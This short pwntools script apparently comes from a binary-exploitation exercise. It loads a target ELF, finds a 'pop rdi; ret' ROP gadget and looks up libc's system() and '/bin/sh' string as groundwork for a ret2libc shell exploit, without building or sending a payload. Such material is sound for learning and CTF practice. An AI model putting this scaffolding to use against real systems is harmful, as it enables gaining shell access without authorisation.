from pwn import *

binary = args.BIN
e = context.binary = ELF(binary, checksec=False)

log.info('Discovering gadgets for binary')
r = ROP(e)

log.info('Loading libc')
libc = e.libc

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

log.info('Pop RDI is at 0x%x' % pop_rdi)
log.info('System is at 0x%x' % system)
log.info('/bin/sh is at 0x%x' % bin_sh)
